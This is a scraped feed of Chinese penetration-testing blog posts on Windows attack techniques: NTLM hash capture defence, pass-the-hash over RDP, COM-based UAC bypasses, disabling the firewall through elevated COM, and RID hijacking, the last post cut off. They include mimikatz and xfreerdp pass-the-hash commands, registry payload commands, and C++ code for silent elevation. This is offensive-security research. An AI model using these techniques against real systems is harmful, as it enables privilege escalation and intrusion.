结合利用思路，在此提出防御建议： 用户认证方式应禁止设置为Automatic logon with current user name and password，对应注册表键值禁止被修改为0 查询命令如下： REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3&quot; /v 1A00 否则，很有可能被破解出客户端当前登录用户的口令 0x06 小结 本文介绍了通过HTTP协议获得客户端当前登录用户Net-NTLM hash的方法，找到限制条件(Intranet zone下或者用户认证方式被修改为Automatic logon with current user name and password)，限制条件同样适用于Responder和Inveigh的HTTP认证拦截功能，最后给出防御建议： 用户认证方式应禁止设置为Automatic logon with current user name and password LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Pass the Hash with Remote Desktop]]></title>
    <url>%2Fposts%2Fa386afdd.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，如果获得了某个用户的NTLM hash，我们可以尝试使用Pass the hash的方法对WMI和SMB服务进行登录，那么，Pass the hash能否用于远程桌面呢？这其中有什么限制条件呢？本文将要进行测试并总结。 关于Pass the hash的利用可参考之前的文章： 《域渗透——Pass The Hash的实现》 0x01 简介 本文将要介绍以下内容： Restricted Admin mode介绍 Pass the Hash with Remote Desktop的适用条件 Pass the Hash with Remote Desktop的实现方法 0x02 Restricted Admin mode简介 官方说明： https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/ 本节参照官方说明，加入个人理解，如果有误，欢迎纠正 Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中 适用系统 Windows 8.1和Windows Server 2012 R2默认支持该功能 Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351 注： 相关资料可参考： https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997 https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro 开启Restricted Admin mode的方法方法1: 安装补丁3126593实现原理同下文的方法2(修改注册表) 参考链接： https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro 方法2： 修改注册表位置： HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa 新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭 对应命令行开启的命令如下： REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f 使用Restricted Admin mode客户端命令行： mstsc.exe /restrictedadmin 如果当前系统不支持Restricted Admin mode，执行后弹出远程桌面的参数说明，如下图 如果当前系统支持Restricted Admin mode，执行后弹出远程桌面的登录界面，如下图 值得注意的是，Restricted Admin mode使用当前Windows登录凭据，不需要输入口令，直接登录即可 注： 正是这项功能使得Pass the hash的利用有了可能 更进一步，Pass the Hash with Remote Desktop的前提就是系统支持Restricted Admin mode 具体的说，Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode 注： 一些资料提到Pass the Hash with Remote Desktop适用于Windows 8.1和Windows Server 2012 R2，这个结论并不确切，准确的说，Windows 7和Windows Server 2008 R2安装补丁后同样适用 0x03 Pass the Hash with Remote Desktop的实现方法 测试环境： Server： OS: Server2012 R2 IP: 192.168.62.136 Computer Name: remoteserver User Name: administrator NTLM hash: d25ecd13fddbb542d2e16da4f9e0333d 开启Restricted Admin mode Client: 支持Restricted Admin mode 方法1： mimikatz实际上为Overpass-the-hash 需要管理员权限 mimikatz命令如下： privilege::debug sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot; 执行后弹出远程登录界面，如下图 选择连接，成功实现远程登录 方法2： FreeRDP下载地址： https://github.com/FreeRDP 可供参考的文章： https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/ https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ FreeRDP实现了远程桌面协议，支持传入hash 支持Linux、Windows和MAC，下载地址如下： https://github.com/FreeRDP/FreeRDP/wiki/PreBuilds linux下使用明文远程登录的参数： xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore 测试成功 linux下使用hash远程登录的参数： xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore 测试失败 Windows下也是同样的测试结果 猜测FreeRDP移除了该功能，其他人也有同样的测试结果，链接如下： https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/ https://twitter.com/egyp7/status/776053410231558148 补充： 包含pth功能的旧版FreeRDP的的下载地址： https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz 需要重新编译，支持pth参数 0x04 防御检测 Restricted Admin mode本来是为了提高系统的安全性，但是却支持了Pass the Hash的利用 所以在防御上，针对Pass the Hash的利用进行防御就好，开启Restricted Admin mode有助于提高系统的安全性 可参考微软官方文档，地址如下： http://www.microsoft.com/en-us/download/details.aspx?id=36036 0x05 小结 本文对Pass the Hash with Remote Desktop的方法进行了分析，找到了其中的限制条件（Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode），对Restricted Admin mode的关键部分进行了说明 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过COM组件IARPUninstallStringLauncher绕过UAC]]></title>
    <url>%2Fposts%2F1a4cfef2.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《通过COM组件NetFwPolicy2越权关闭防火墙》验证结论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框。同时介绍了如何在注册表中寻找可以高权限运行的COM组件。 本次将要继续，介绍另一个可供使用的COM组件。 在我搜索到HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{FCC74B77-EC3E-4dd8-A80B-008A702075A9}时，获得名称ARP UninstallString Launcher 经过进一步搜索，发现ExpLife已经公开了这个COM组件的利用方法，地址如下： http://www.freebuf.com/articles/system/116611.html 感谢ExpLife的分享，缩短了我研究的时间，所以本文将要在此基础上，侧重于分析原理和介绍更多利用方式 0x01 简介 本文将要介绍以下内容： 复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法 利用分析 更多利用方式 0x02 复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法 ExpLife是从寻找不会弹出UAC对话框的功能入手，通过逆向找到可供利用的COM组件 而我的思路是先找到支持提升权限的COM组件，然后查找这个COM组件对应的功能 两种方法各有利弊： ExpLife的方法需要对系统有足够了解，得找到不会弹出UAC对话框的功能 我采用的方法能够找到一些不常见的COM组件，其中的功能在平时也许很难接触 但使用Explife的方法，如果找到了一个功能，使用动态下断点和静态分析的方法对COM组件的逆向会很高效 而我采用的方法只能通过注册表键值内容做一个大概的判断，需要进一步搜索才能定位具体的COM组件，效率不高 可以将两种方法相结合，但最重要的一点，找到的COM组件不仅要能够提升权限，还要能够执行程序(或是其他有用的功能)才可以 下面开始介绍利用原理： 1、“偷偷”绕过UAC在之前的文章《渗透基础——获得当前系统已安装的程序列表》曾提到过控制面板 -&gt; 程序 -&gt; 程序和功能中的程序列表对应以下注册表键值： 高权限程序对应注册表键值HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\ 低权限程序对应注册表键值HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\(实际上为HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\) 在卸载程序时，同时会删除程序对应的注册表键值 而我们在删除高权限的程序时，会删除HKEY_LOCAL_MACHINE\下的键值，正常情况下该操作会弹出UAC对话框，但实际上并没有，这里就可以判断系统“偷偷”绕过了UAC 如果我们能够模拟这个功能，那么也能“偷偷”绕过UAC 2、执行程序注册表项Uninstall下有一个键为”UninstallString”，内容为要执行的命令 如果我们替换成payload，就能实现高权限执行，即UAC绕过并执行任意程序 以上两点相结合，满足了通过COM组件绕过UAC的必要条件 所以，接下来只要能够模拟卸载程序的功能即可 逆向分析过程和模拟卸载的功能ExpLife在他的文章中已经写得很详细，不再赘述 引用文中的分析： 通过调用位于CARPUninstallStringLauncherCOM组件中IARPUninstallStringLauncher接口的LaunchUninstallStringAndWait方法来实现卸载程序 关键代码如下： CLSID clsid; IID iid; LPVOID ppv = NULL; HRESULT hr; PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait pfn_LaunchUninstallStringAndWait = NULL; PFN_IARPUninstallStringLauncher_Release pfn_IARPUninstallStringLauncher_Release = NULL; if (IIDFromString(L&quot;{FCC74B77-EC3E-4DD8-A80B-008A702075A9}&quot;, &amp;clsid) || IIDFromString(L&quot;{F885120E-3789-4FD9-865E-DC9B4A6412D2}&quot;, &amp;iid)) return 0; CoInitialize(NULL); if (SUCCEEDED(hr)) { pfn_LaunchUninstallStringAndWait = (PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(*(DWORD*)(*(DWORD*)ppv + 12)); pfn_IARPUninstallStringLauncher_Release = (PFN_IARPUninstallStringLauncher_Release)(*(DWORD*)(*(DWORD*)ppv + 8)); if (pfn_LaunchUninstallStringAndWait &amp;&amp; pfn_IARPUninstallStringLauncher_Release) { pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L&quot;{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}&quot;, 0, NULL); pfn_IARPUninstallStringLauncher_Release((LPVOID*)ppv); } } CoUninitialize(); return 0; 其中&quot;{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}&quot;对应注册表Uninstall下的键名称 所以我们需要提前在注册表Uninstall下新建一个键 由于是绕过UAC，代表我们还没有管理员权限，因此无法操作注册表HKEY_LOCAL_MACHINE 所以只能操作注册表HKEY_CURRENT_USER 通过cmd新建注册表项，并添加payload，命令如下： REG ADD &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload&quot; /v UninstallString /t REG_SZ /d &quot;c:\windows\system32\calc.exe&quot; /f 实际创建的位置为HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload，如下图 注： 如果想要自己在注册表界面新建键值进行测试，创建的位置为HKEY_USERS\[sid]\，而不是HKEY_CURRENT_USER 接下来，还需要做的是修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe，这样就能够“偷偷”绕过UAC，不会弹框 可供参考的地址： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp 将以上代码整合，完整的实现代码如下： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp 补充： 对于COM组件IARPUninstallStringLauncher，在执行”UninstallString”时，只有启动的程序结束以后当前进程才会自动退出 0x03 更多利用方式 关于更多利用方式，指的是模拟成白名单进程的方法 0x02的实例是修改当前进程PEB结构，将当前进程模拟为explorer.exe 当然也可以直接用ExpLife的两个方法：dll注入和通过rundll32加载dll 这里再给出一个利用方式：通过Powershell调用COM组件，默认powershell.exe是可信进程，所以也不会弹出UAC的对话框 这里需要使用powershell脚本Invoke-ReflectivePEInjection.ps1，下载地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 提供的一个功能是在powershell的内存中加载exe 为了使我们的程序扩展性更强，将源代码改成支持传入参数的方式，参数为要读取的注册表项，完整代码如下： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp 接着使用Invoke-ReflectivePEInjection.ps1封装exe，并传入参数，powershell的代码如下： $PEBytes = [IO.File]::ReadAllBytes(&#39;c:\\test\\IARPUninstallStringLauncher.exe&#39;) Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs &quot;payload&quot; 其中参数payload对应注册表项HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload，其中的键”UninstallString”存储要执行的程序路径 如下图 通过powershell执行Invoke-ReflectivePEInjection.ps1，在powershell.exe的内存中加载IARPUninstallStringLauncher.exe，以高权限调用COM组件，由于powershell.exe为可信进程，所以能够直接绕过UAC 注： 实际测试的一个小bug，在执行完payload后，powershell进程在退出时会弹框报错，提示内存不可读，如下图 一个最简单的解决方法： 在脚本Main函数末尾加1 如下图 完整利用方式： 1、新建注册表，并写入要执行的程序路径，命令如下： REG ADD &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload&quot; /v UninstallString /t REG_SZ /d &quot;c:\windows\system32\calc.exe&quot; /f 2、编译IARPUninstallStringLauncher.exe 源码地址： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp 3、通过powershell脚本加载exe并传入参数，powershell命令如下： $PEBytes = [IO.File]::ReadAllBytes(&#39;c:\\test\\IARPUninstallStringLauncher.exe&#39;) Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs &quot;payload&quot; 注： 原脚本Main函数末尾记得加1，防止报错 0x04 小结 本文介绍了通过COM组件IARPUninstallStringLauncher绕过UAC的方法，分享多种利用方式(修改PEB模拟成explorer.exe+以powershell.exe加载exe)，得出结论：只要以(或者模拟成)可信的进程(如explorer.exe、powershell.exe)，加载高权限的COM组件不会弹出UAC的对话框。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过COM组件NetFwPolicy2越权关闭防火墙]]></title>
    <url>%2Fposts%2Fcc805307.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《通过COM组件IFileOperation越权复制文件》介绍了通过COM组件IFileOperation越权复制文件的三种方法，我们得出一个推论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框 那么，这个推论是否适用于其他COM组件呢？又有哪些COM组件可以利用呢？ 本文将要通过COM组件越权关闭防火墙的方法，详细记录研究过程 0x01 简介 寻找可以高权限运行的COM组件 编写c++程序实现关闭防火墙 添加代码以高权限运行COM组件 添加代码模拟进程explorer.exe 开源完整实现代码 0x02 寻找可以高权限运行的COM组件 通过COM组件IFileOperation实现越权复制文件有一个前提： COM组件能够以高权限运行 对于IFileOperation，它提供了一个参数(SetOperationFlags)可以指定启动的权限 官方文档： https://msdn.microsoft.com/en-us/library/bb775799.aspx 为了找到其他可以高权限运行的COM组件，我们首要的是寻找能够以高权限运行COM组件的方法 经过查找，我找到了一个资料，利用COM Elevation Moniker能够以高权限运行COM组件 官方文档： https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx 通过学习官方文档，发现COM Elevation Moniker的使用对COM组件有如下要求： 该COM组件被注册 注册位置在HKEY_LOCAL_MACHINE下，也就是说，需要以管理员权限注册这个COM组件才可以 注册表HKEY_LOCAL_MACHINE\Software\Classes\CLSID下需要指定三项键值 {CLSID}, LocalizedString(REG_EXPAND_SZ):displayName {CLSID}/Elevation,IconReference(REG_EXPAND_SZ):applicationIcon {CLSID}/Elevation,Enabled(REG_DWORD):1 注： 经过实际测试，以上三项缺一不可 接下来，按照这个要求搜索注册表寻找可用的COM组件 搜索位置：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID 搜索关键词：Elevation 经过一段时间的搜索，我找到了一个可用的COM组件，位置：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD} 信息如下图 HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD}\Elevation的信息如下图 满足COM Elevation Moniker的要求 通过搜索名称“HNetCfg.FwPolicy2”发现这个COM组件同防火墙的操作有关 0x03 编写c++程序实现关闭防火墙 对应COM接口INetFwProfile，于是查找资料尝试编写c程序实现 通过COM接口INetFwProfile关闭防火墙的完整c++代码如下： #include &quot;stdafx.h&quot; #include &lt;Strsafe.h&gt; #include &lt;windows.h&gt; #include &lt;netfw.h&gt; int _tmain(int argc, _TCHAR* argv[]) { INetFwMgr *g_pFwMgr = NULL; INetFwProfile *g_pFwProfile = NULL; INetFwPolicy *g_pFwProlicy = NULL; CoInitializeEx(NULL,COINIT_MULTITHREADED); VARIANT_BOOL fwEnabled; HRESULT hr = CoCreateInstance(__uuidof(NetFwMgr), 0, CLSCTX_INPROC_SERVER,__uuidof(INetFwMgr),reinterpret_cast&lt;void **&gt;(&amp;g_pFwMgr)); if (SUCCEEDED(hr) &amp;&amp; (g_pFwMgr != NULL)) { hr = g_pFwMgr-&gt;get_LocalPolicy( &amp;g_pFwProlicy ); if (SUCCEEDED(hr) &amp;&amp; (g_pFwProlicy != NULL)) { hr = g_pFwProlicy-&gt;get_CurrentProfile( &amp;g_pFwProfile ); hr = g_pFwProfile-&gt;get_FirewallEnabled(&amp;fwEnabled); if (fwEnabled != VARIANT_FALSE) { printf(&quot;The firewall is on.\n&quot;); hr = g_pFwProfile-&gt;put_FirewallEnabled(VARIANT_FALSE); if (FAILED(hr)) { printf(&quot;put_FirewallEnabled failed: 0x%08lx\n&quot;, hr); return 0; } printf(&quot;The firewall is now off.\n&quot;); } else { printf(&quot;The firewall is off.\n&quot;); } } } return 0; } 程序首先读取防火墙配置，如果防火墙的状态是开启，尝试对其关闭 当然，需要管理员权限执行，执行后失败，弹框如下图 接着查找问题，找到原因，官方文档： https://msdn.microsoft.com/en-us/library/windows/desktop/aa365287 原因如下： [The Windows Firewall API is available for use in the operating systems specified in the Requirements section. It may be altered or unavailable in subsequent versions. For Windows Vista and later, use of the Windows Firewall with Advanced Security API is recommended.] 需要换用Windows Firewall with Advanced Security API，官方文档： https://msdn.microsoft.com/en-us/library/windows/desktop/aa366418 找到关闭防火墙的实例，地址如下： https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606 发现新的COM组件为NetFwPolicy2 实例代码已经很清楚，但为了配合后面会使用到的COM Elevation Moniker，在结构上需要做一些修改 0x04 添加代码以高权限运行COM组件 官方文档： https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx 官方文档提供了一个实例，但是需要做一些修改 修改后的代码如下： HWND hwnd = GetConsoleWindow(); BIND_OPTS3 bo; WCHAR wszCLSID[50]; WCHAR wszMonikerName[300]; void ** ppv = NULL; StringFromGUID2( __uuidof(NetFwPolicy2),wszCLSID,sizeof(wszCLSID)/sizeof(wszCLSID[0])); hr = StringCchPrintf(wszMonikerName,sizeof(wszMonikerName)/sizeof(wszMonikerName[0]),L&quot;Elevation:Administrator!new:%s&quot;, wszCLSID); memset(&amp;bo, 0, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hwnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; hr = CoGetObject(wszMonikerName, &amp;bo, IID_PPV_ARGS(&amp;pNetFwPolicy2)); 对于CoGetObject(),第一个参数为GUID对应的字符串，需要指定为NetFwPolicy2，第三个参数做了一个封装，实际为REFIID riid和void **ppv 这段代码要放在CoCreateInstance函数创建实例之后 我们现在重新分析0x03中关闭防火墙的实现代码，官方文档(含实例代码): https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606 关键代码如下图 调用CoCreateInstance函数创建实例被单独写在了一个函数WFCOMInitialize中，如果我们在WFCOMInitialize中实现了COM Elevation Moniker申请高权限，但是在函数返回时无法传出修改的值void **ppv(函数返回值为hr)，也就是说即使在函数WFCOMInitialize中申请到了高权限，跳出函数WFCOMInitialize后，回到主函数，后面使用的COM组件依然是旧的低权限 所以我们需要对实例代码作修改，将调用CoCreateInstance函数创建实例的代码提取出来，放在主函数中 0x05 添加代码模拟进程explorer.exe 这部分内容在之前的文章《通过COM组件IFileOperation越权复制文件》有过介绍，对应方法2，可供参考的代码： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp 修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe 完整代码已开源，地址如下： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp 0x06 小结 本文介绍了通过COM组件越权关闭防火墙的思路和实现方法，验证了推论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过COM组件IFileOperation越权复制文件]]></title>
    <url>%2Fposts%2F30597e1d.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Empire中的Invoke-WScriptBypassUAC利用分析》曾介绍过一个越权复制文件的方法，在普通用户的权限下，利用wusa能够将cab文件释放至管理员权限的文件夹，进一步可以实现文件名劫持和UAC绕过。 但该功能在Win10下被取消，那么有没有更为通用的方法呢？ 本文将要介绍一个适用于Win7-Win10的方法——利用COM组件IFileOperation 0x01 简介 利用原理 三种实现思路 实例代码 实际测试 利用分析 0x02 利用原理 注： 该方法学习自Defcon 25中的workshop，Ruben Boonen 《UAC 0day, all day!》 ppt下载地址： https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf 利用COM组件IFileOperation越权复制文件的前提： Win7以后的系统 可信路径下的可信文件(例如explorer.exe，powershell.exe) 所以有以下三种实现思路： 1、dll劫持或是dll注入由于可信路径下的可信文件一般都是在需要管理员权限的路径下，所以普通用户权限下基本无法实现dll劫持 可行的方法是dll注入 例如explorer.exe，在普通用户权限就可以对其进行dll注入 2、修改PEB结构，欺骗PSAPI，调用COM组件IFileOperationCOM组件通过Process Status API (PSAPI)读取进程PEB结构中的Commandline来识别它们正在运行的进程 如果将进程的Path改成可信文件(如explorer.exe)，就能够欺骗PSAPI，调用COM组件IFileOperation实现越权复制 3、通过可信文件直接调用COM组件IFileOperation例如powershell.exe为可信文件，并且能够直接调用COM组件IFileOperation 0x03 实现方法1：dll注入explorer.exe 具体实现分为如下两段： 将dll注入到进程explorer.exe dll实现调用COM组件IFileOperation复制文件 github已经有一个完整的实现代码，因此可以参考该工程对其分析，工程地址： https://github.com/hjc4869/UacBypass (1)工程UacBypassTest实现了dll注入到进程explorer.exe 去掉不必要的功能，只保留将UacBypass.dll注入到进程explorer.exe的功能： 删除Line 58即可 (2)工程UacBypass实现了调用COM组件IFileOperation复制文件 该工程编译后生成文件UacBypass.dll，实现了将同级目录下的ntwdblib.dll复制到C:\windows\System32下 实际测试：运行UacBypassTest.exe，将UacBypass.dll注入到进程explorer.exe，成功实现越权文件复制 0x04 实现方法2：修改PEB结构，欺骗PSAPI，调用COM组件IFileOperation 参考工程UacBypass，将dll转为exe，添加头文件，修复bug，可供参考的完整代码： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IFileOperation.cpp 实现了将c:\6\ntwdblib.dll复制到c:\windows\system32下 代码分析： 成功的前提是指定了该COM组件的属性(需要提升权限) 官方文档地址： https://msdn.microsoft.com/en-us/library/bb775799.aspx 代码位置： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IFileOperation.cpp#L14 属性说明： FOF_NOCONFIRMATION :不弹出确认框 FOF_SILENT:不弹框 FOFX_SHOWELEVATIONPROMPT:需要提升权限 FOFX_NOCOPYHOOKS:不使用copy hooks FOFX_REQUIREELEVATION:默认需要提升权限 FOF_NOERRORUI:报错不弹框 实际测试：直接运行exe，会弹出UAC的确认框，提示权限不够，如果选择允许，能够实现文件复制 接下来需要添加修改PEB结构的功能，为了欺骗PSAPI，共需要修改以下位置： -_RTL_USER_PROCESS_PARAMETERS中的ImagePathName-_LDR_DATA_TABLE_ENTRY中的FullDllName-_LDR_DATA_TABLE_ENTRY中的BaseDllName 注： 不需要修改_RTL_USER_PROCESS_PARAMETERS中的CommandLine，该属性能够通过Process Explorer查看，为了更具有欺骗性，可以选择将其修改 我在这里参考了UACME中supMasqueradeProcess()的实现代码，地址如下： https://github.com/hfiref0x/UACME/blob/143ead4db6b57a84478c9883023fbe5d64ac277b/Source/Akagi/sup.c#L947 我做了以下修改： 不使用ntdll.lib文件(安装DDK后包含)，改为通过ntdll获得NTAPI 提取关键代码 修复bug 添加调用COM组件IFileOperation复制文件的功能 … 更多细节可参考开源的代码，地址如下： https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp 代码实现了修改当前进程的PEB结构，欺骗PSAPI，将其识别为explorer.exe，接着调用COM组件IFileOperation实现文件复制 实际测试：当前进程被修改为explorer.exe，如下图 文件复制成功，并且没有弹出UAC的确认框，实现了越权复制文件 0x05 实现方法3：通过powershell.exe调用COM组件IFileOperation 先通过c#编译一个COM组件实现调用COM组件IFileOperation复制文件，接着通过powershell来调用这个COM组件 1、编写COM组件代码参考地址： https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/FileOperations/FileOperations 编译成功后生成FileOperation.dll 注： Ruben Boonen(b33f@FuzzySecurity)参考的源工程： https://github.com/mlaily/MSDNMagazine2007-.NET-Matters-IFileOperation-in-Windows-Vista 他在此基础上做了修改(修改类名等)，使得powershell能够直接调用COM组件，这个功能很棒 2、通过powershell来调用这个COM组件有以下两种方式： (1) [System.Reflection.Assembly]::LoadFile($Path) 直接加载文件 (2) [Reflection.Assembly]::Load($bytes) 将文件压缩为字符串保存在数组中，可参考Matthew Graeber的方法，地址如下： http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html 能够直接输出可供使用的powershell代码 注： 两种方式的比较在之前的文章《利用Assembly Load &amp; LoadFile绕过Applocker的分析总结》有过介绍 方法3完整的实现代码可参考： https://github.com/FuzzySecurity/PowerShell-Suite/blob/ebbb8991a8a051b48c05ce676524a1ba787dbf0c/Bypass-UAC/Bypass-UAC.ps1#L1082 实际测试：执行powershell脚本，加载COM组件IFileOperation，由于powershell.exe为可信进程，所以不会弹出UAC的确认框，成功实现越权复制文件 ##0x06 利用分析COM组件IFileOperation适用于Win7-Win10，所以越权复制的方法也是可用的 对于explorer.exe，加载高权限的COM组件不会弹出UAC的对话框。 本文已经实现了模拟explorer.exe的方法，那么是否有其他可用的COM组件呢？又能完成哪些“提权操作呢”?留在以后会慢慢介绍 0x07 本文介绍了通过COM组件IFileOperation越权复制文件的三种方法，整理并开发了实现代码，可用于直接测试 最后感谢Ruben Boonen(b33f@FuzzySecurity)在研究上对我的帮助 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows帐户的RID Hijacking]]></title>
    <url>%2Fposts%2Ffa39105d.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《渗透技巧——Windows系统的帐户隐藏》介绍过利用帐户克隆建立隐藏帐户的技巧，是通过复制目标帐户对应注册表项F键的值，使得隐藏帐户获得了相同的权限。 如果换一种思路，将目标帐户对应注册表项F键的部分内容覆盖已有帐户，那么已有帐户能否获得目标帐户的权限呢？ 这就是本文将要介绍的方法——RID Hijacking 注： 该方法最早公开于2017年12月，地址如下： http://csl.com.co/rid-hijacking/ 0x01 简介 本文将要介绍以下内容： RID劫持的方法 编写脚本的实现思路 利用分析 防御检测 0x02 相关概念 SID全称Security Identifiers(安全标识符)，是Windows系统用于唯一标识用户或组的可变长度结构 官方说明地址： https://msdn.microsoft.com/en-us//library/windows/desktop/aa379594(v=vs.85).aspx SID包含以下信息： The revision level of the SID structure 48-bit identifier authority value relative identifier (RID) 实例Windows命令行执行whoami /all可获得当前用户的SID，如下图 SID为： S-1-5-21-2752016420-1571072424-526487797-1001 S表示该字符串是SID1表示SID的版本号5-21-2752016420-1571072424-526487797对应ID authority1001表示RID RIDWindows系统帐户对应固定的RID： 500： ADMINISTRATOR 501： GUEST 502: krbtgt(域环境) 512: Domain Admins(域环境) 513: Domain Users(域环境) 514: Domain Guests(域环境) 515: Domain Computers(域环境) 516: Domain Controllers(域环境) 0x03 RID劫持方法 对于Windows系统来说，注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下包含当前系统的所有帐户列表，每个帐户的默认键值对应该帐户详细信息的注册表位置(即RID的十六进制表示) 注： 需要获得system权限才能读取 举例如图 帐户a的注册表默认值为0x3e9 注： 帐户a为普通用户权限 详细信息的注册表位置为HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9 详细信息如下图 F键的内容如下图 偏移位置0x30f和0x31f对应RID 由于是litte-endian字节存储，所以上图中从F键获得的RID值为0x03E9，转换为十进制为1001 使用帐户a登录，执行whoami /all获得帐户a的SID，如下图 内容相同 测试1： 伪造成内置管理员帐户ADMINISTRATOR将帐户a的RID修改为500(固定值，表示windows系统内置管理员ADMINISTRATOR)，对应十六进制为01F4，如下图 注： 帐户a需要重新登录才能生效 登录帐户a，帐户a继承了ADMINISTRATOR的权限，成为了管理员 登录用户名为： 原用户名.机器名，如下图 用户文件夹也随之改变，如下图 直观理解： 帐户a变成了新帐户a.WIN-BH7SVRRDGVA，继承了ADMINISTRATOR的权限 测试2： 伪造成管理员帐户1新建管理员帐户1，RID为1000(0x03e8)，如下图 将帐户a的RID修改为1000(0x03e8) 修改后如下图 重新登录帐户a 帐户a继承了帐户1的权限，成为了管理员 登录用户名变为1，执行whoami /all输出的用户名为a，但RID为1000(帐户1的RID)，如下图 环境变量对应为用户1，如下图 直观理解： 帐户a变成了原有帐户1，继承了1的权限，但在部分功能的显示上还保留帐户a 0x04 编写脚本的实现思路 实现思路 获得system权限 读取指定帐户的注册表信息 修改固定偏移地址，指定为新的RID 导入注册表，完成修改 具体实现细节上可参考文章《渗透技巧——Windows系统的帐户隐藏》中的说明 参考代码： https://github.com/3gstudent/Windows-User-Clone 由于功能较为简单，因此实现代码留给读者完成 msf对应的实现模块： windows/manage/rid_hijack 0x05 利用分析 对于RID Hijacking，实现原理上很简单： 定位帐户的注册表文件，修改代表RID信息的位置即可 但在利用上存在以下不足： 帐户重新登录才能生效 环境变量被修改，影响正常使用 